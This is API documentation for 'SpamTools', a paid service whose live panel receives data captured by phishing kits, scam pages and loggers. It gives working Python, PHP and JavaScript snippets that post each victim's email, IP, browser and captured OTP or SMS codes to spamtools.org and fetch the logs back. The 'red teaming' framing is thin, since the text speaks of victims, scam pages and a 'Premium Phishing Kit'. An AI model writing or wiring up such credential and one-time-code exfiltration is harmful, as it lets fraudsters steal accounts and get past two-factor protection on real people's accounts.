# SpamtoolsApi
SpamTools API documentation

# 🛠️ Using SpamTools API – Getting Access

Welcome to **SpamTools API** – your go-to solution for automating phishing simulations, red teaming operations, and email-based threat testing.

Before you can begin using any of our API endpoints, you must have an **active subscription or purchase** tied to your account. Here's everything you need to know to get started:

---

## 🔐 API Access Requires Purchase

To access **SpamTools API**, you must first make a valid purchase through your [SpamTools Dashboard](https://spamtools.io/dashboard). Upon purchase, you'll receive an **API Hash**, which acts as your access token.


## 📦 Why is this Required?

SpamTools provides services that are sensitive in nature (phishing simulation, red team automation, tracking, etc.). Requiring a valid purchase ensures:

- ✅ Ethical and controlled usage  
- 🚫 Abuse prevention  
- 📊 Fair access to resources  
- 📞 Enhanced tracking and support  


## 🧾 How to Get Your API Hash

1. Log into your account at [https://spamtools.io/dashboard](https://spamtools.io/dashboard)
2. Navigate to **Subscriptions** or **Purchases**
3. Select an active product or service
4. Copy the **API Hash** provided

> 📌 **Note:** Each API Hash is unique to your purchase. Some API routes may require product-specific hashes.

---
---

# 🔐 Authentication

To use any SpamTools API route, you must validate your **subscription hash**.  
This hash is provided after purchasing a product and represents your active access.

> 🧠 You can find your hash in your [SpamTools Dashboard](https://spamtools.io/dashboard) under the active subscription.


## ✅ How Authentication Works

Every API request must include your **subscription hash**.  
To validate the hash before using it, send a `POST` request to:

```
POST https://spamtools.org/wp-json/spamtools/v1/check-subscription
```

### ✅ Expected Payload

```json
{
  "hash": "YOUR_SUBSCRIPTION_HASH"
}
```

### ✅ Example Successful Response

```json
{
  "ID": 14,
  "hashid": "abc123hashvalue",
  "status": "active",
  "category": "phishing-kit"
}
```


## 💻 Example Code Snippets

### 🐍 Python

```python
import requests

hash_value = input("Enter your subscription hash: ").strip()

res = requests.post("https://spamtools.org/wp-json/spamtools/v1/check-subscription", json={"hash": hash_value})

if res.status_code == 200:
    print("✅ Hash valid:", res.json())
else:
    print("❌ Error:", res.status_code, res.json())
```

### 🐘 PHP

```php
<?php
$hash = "your_subscription_hash";

$response = file_get_contents("https://spamtools.org/wp-json/spamtools/v1/check-subscription", false, stream_context_create([
    'http' => [
        'method' => 'POST',
        'header'  => "Content-type: application/json\r\n",
        'content' => json_encode(['hash' => $hash])
    ]
]));

$data = json_decode($response, true);

if (isset($data['status']) && $data['status'] === 'active') {
    echo "✅ Hash is valid.\n";
} else {
    echo "❌ Invalid or expired hash.\n";
}
?>
```

### 🌐 JavaScript (Fetch)

```js
const hash = "your_subscription_hash";

fetch("https://spamtools.org/wp-json/spamtools/v1/check-subscription", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ hash }),
})
  .then((res) => res.json())
  .then((data) => {
    if (data.status === "active") {
      console.log("✅ Hash is valid:", data);
    } else {
      console.log("❌ Invalid or expired hash.");
    }
  })
  .catch((err) => {
    console.error("❌ Request failed:", err);
  });
```

---
---

# 📥 Adding Data to Live Panel

Once your subscription hash is verified and active, you can start sending captured data from your phishing kits, scam pages, or payloads directly to the **SpamTools Live Panel**.



## ✅ Endpoint

```
POST https://spamtools.org/wp-json/spamtools/v1/add-subscription-data
```



## 🧾 Required Fields

| Field         | Type     | Required | Description                                  |
|--------------|----------|----------|----------------------------------------------|
| `hash`        | string   | ✅       | Your valid subscription hash                 |
| `user_session`| string   | ✅       | Unique session ID per victim/session         |
| `data1`       | string   | ❌       | Any captured info (e.g., name, email, etc.)  |
| `data2`       | string   | ❌       | Any captured info (e.g., browser, OS)        |
| `data3`       | string   | ❌       | Any captured info (e.g., IP, location)       |
| `data4`       | string   | ❌       | Any extra log info or custom payload         |

> 🧠 `user_session` is used to group multiple logs together. If the same `user_session` is reused, data is **appended** to existing logs instead of creating a new row.



## 📦 Example Payload

```json
{
  "hash": "abc123hashvalue",
  "user_session": "9c7a3edb-2f2f-11ee-be56-0242ac120002",
  "data1": "Email: user@example.com",
  "data2": "Browser: Chrome",
  "data3": "IP: 192.168.1.2",
  "data4": "OTP: 823190"
}
```



## ✅ Example Response (Success)

```json
{
  "success": "Data added successfully."
}
```



## ❌ Possible Error Responses

### Missing required fields:

```json
{
  "error": "Hash and User Session are required."
}
```

### Invalid or expired hash:

```json
{
  "error": "Invalid hash."
}
```

```json
{
  "error": "Hash is expired."
}
```

### Update failure:

```json
{
  "error": "Failed to update data."
}
```

### Insert failure:

```json
{
  "error": "Failed to insert data."
}
```


## 💻 Code Snippets

### 🐍 Python (Minimal Example)

```python
import requests

payload = {
    "hash": "your_subscription_hash",
    "user_session": "session-uuid-or-id",
    "data1": "Email: victim@example.com",
    "data2": "Browser: Firefox",
    "data3": "IP: 192.168.0.1",
    "data4": "Captured OTP: 372829"
}

res = requests.post("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data", json=payload)

print(res.status_code, res.json())
```


### 🐘 PHP (cURL)

```php
<?php
$payload = json_encode([
    "hash" => "your_subscription_hash",
    "user_session" => "unique-session-id",
    "data1" => "Email: test@example.com",
    "data2" => "Device: Android",
    "data3" => "IP: 192.0.2.1",
    "data4" => "SMS Code: 999111"
]);

$ch = curl_init("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

$response = curl_exec($ch);
curl_close($ch);

echo $response;
?>
```


### 🌐 JavaScript (Browser/Node)

```js
fetch("https://spamtools.org/wp-json/spamtools/v1/add-subscription-data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    hash: "your_subscription_hash",
    user_session: "session-id",
    data1: "Username: test",
    data2: "Browser: Chrome",
    data3: "IP: 203.0.113.1",
    data4: "OTP: 129384"
  })
})
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error("Error:", err));
```


## 📌 Notes

- Each kit/logger/page should generate a **unique session ID per victim** to avoid overwriting logs.
- You can reuse the same `user_session` to **append logs progressively**.
- Make sure your subscription hash is valid before using this endpoint.

---
---

# 📤 Fetching Data from Live Panel

To read logs from your SpamTools Live Panel, you must provide both your **Security Code** and your **Subscription Hash** for secure access.

Unlike the `add-subscription-data` endpoint, the fetch endpoint has **strict security requirements** to prevent unauthorized access to sensitive data. The security code expires every 24 hours or if you logout.


## 🔐 Required Authentication Format

To fetch logs, you must send a POST request to:

```
POST https://spamtools.org/wp-json/spamtools/v1/fetch-subscription-data
```

With the following payload:

```json
{
  "securitycode_hash": "SECURITYCODE:SUBSCRIPTION_HASH"
}
```


## 🔑 Where to Find Security Code

1. Go to your [SpamTools Dashboard](https://spamtools.org/dashboard)
2. Look for the **Security Code** in the top header area
3. Combine it with your Subscription Hash using a colon `:`

> Example: `R4nD0mS3cC0d3:abc123hashvalue`


## 📦 Example Payload

```json
{
  "securitycode_hash": "R4nD0mS3cC0d3:abc123hashvalue"
}
```


## ✅ Example Successful Response

```json
{
  "username": "john_doe",
  "product": "Premium Phishing Kit",
  "data1": "Email: test@example.com\nEmail: user2@example.com",
  "data2": "Browser: Chrome\nBrowser: Safari",
  "data3": "IP: 192.168.1.2\nIP: 10.0.0.1",
  "data4": "OTP: 123456\nOTP: 654321"
}
```


## ❌ Possible Error Responses

### Missing or invalid format:

```json
{
  "error": "SecurityCode:Hash input is required."
}
```

```json
{
  "error": "Invalid input format. Use SecurityCode:Hash."
}
```

### Invalid credentials:

```json
{
  "error": "Invalid security code."
}
```

```json
{
  "error": "Invalid hash."
}
```

### Unauthorized access:

```json
{
  "error": "Hash does not belong to the specified user."
}
```


## 💻 Code Snippets

### 🐍 Python

```python
import requests

securitycode = "your_security_code"
subscription_hash = "your_subscription_hash"

payload = {
    "securitycode_hash": f"{securitycode}:{subscription_hash}"
}

res = requests.post("https://spamtools.org/wp-json/spamtools/v1/fetch-subscription-data", json=payload)

print(res.status_code, res.json())
```


### 🐘 PHP (cURL)

```php
<?php
$payload = json_encode([
    "securitycode_hash" => "your_security_code:your_subscription_hash"
]);

$ch = curl_init("https://spamtools.org/wp-json/spamtools/v1/fetch-subscription-data");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);

$response = curl_exec($ch);
curl_close($ch);

echo $response;
?>
```


### 🌐 JavaScript (Fetch)

```js
fetch("https://spamtools.org/wp-json/spamtools/v1/fetch-subscription-data", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    securitycode_hash: "your_security_code:your_subscription_hash"
  })
})
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error("❌ Error:", err));
```


## 📌 Notes

- This endpoint **requires both** a valid security code and an active subscription hash.
- Data is grouped by session, and multiple entries will appear as newline-separated strings.
- Use this endpoint to pull results for reporting, analysis, or dashboard integration.


## 🔚 That’s It!

You’ve now learned how to:

- ✅ Authenticate your hash  
- ✅ Add data from phishing kits or loggers  
- ✅ Securely fetch results with your security code
- ✅ The security code expires every 24 hours.

Need help? Reach out to us on Telegram: [@spamtoolsorg](https://t.me/spamtoolsorg)
